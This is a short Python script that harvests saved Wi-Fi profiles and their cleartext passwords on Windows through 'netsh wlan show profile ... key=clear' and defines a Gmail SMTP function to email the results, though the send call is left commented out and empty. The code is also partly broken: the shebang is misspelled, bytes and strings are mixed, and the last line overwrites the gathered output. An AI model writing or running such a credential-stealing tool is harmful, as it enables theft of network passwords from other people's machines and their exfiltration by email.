#!/usr/in/env pyhton

import re
import smtplib
import subprocess


def send_mail(email, password, message):
    # very likely outdated
    # create SMTP server instace
    server = smtplib.SMTP("smtp.gmail.com", 587)    # using Google's server
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

result = subprocess.check_output(command, shell=True)
# send_mail("")
